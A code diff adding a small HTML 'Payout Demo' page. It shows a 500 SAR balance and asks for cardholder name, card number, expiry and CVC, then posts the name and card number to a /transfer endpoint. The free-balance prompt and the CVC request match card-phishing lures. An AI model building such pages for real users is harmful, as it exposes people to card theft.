@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wallet Payout</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; background: #f0f0f0; display: flex; justify-content: center; padding: 20px; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 350px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        #status { margin-top: 15px; text-align: center; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2 style="text-align:center">Payout Demo</h2>
+        <p style="text-align:center">Balance: 500 SAR</p>
+        <input type="text" id="name" placeholder="Cardholder Name">
+        <input type="text" id="card" placeholder="16-Digit Card Number" maxlength="16">
+        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+        <input type="password" id="cvc" placeholder="CVC" maxlength="3">
+        <button onclick="send()">Transfer to Card</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        async function send() {
+            const status = document.getElementById('status');
+            status.innerText = "Processing...";
+            const res = await fetch('/transfer', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    name: document.getElementById('name').value,
+                    cardNumber: document.getElementById('card').value,
+                    amount: 500
+                })
+            });
+            const data = await res.json();
+            status.innerText = data.message;
+            status.style.color = data.status === "Success" ? "green" : "red";
+        }
+    </script>
+</body>
+</html>
